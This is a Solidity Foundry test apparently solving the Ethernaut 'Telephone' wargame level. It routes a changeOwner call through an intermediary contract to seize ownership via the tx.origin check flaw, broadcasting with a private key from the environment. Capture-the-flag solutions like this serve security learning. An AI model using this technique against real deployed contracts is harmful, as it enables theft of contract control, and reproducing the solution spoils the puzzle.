// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract IntermetiateContract {
    address NewOwner;

    function ExploitOwner(Telephone _level5, address _newOwner) public {
        _level5.changeOwner(_newOwner);
        NewOwner = _newOwner;
    }

    /* Getter function */
    function GetNewOwner() public view returns (address) {
        return NewOwner;
    }
}

contract TelephoneSolution is Test {
    Telephone level5 = Telephone(0xD4f793357672EE0c9fF2d69822c49191fd50C805);
    IntermetiateContract Intermetiate_Instance = new IntermetiateContract();

    function testTelephoneSolution() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Intermetiate_Instance.ExploitOwner(level5, vm.envAddress("MY_ADDRESS"));
        console.log(Intermetiate_Instance.GetNewOwner());
        assertEq(
            Intermetiate_Instance.GetNewOwner(),
            vm.envAddress("MY_ADDRESS")
        );
        vm.stopBroadcast();
    }
}
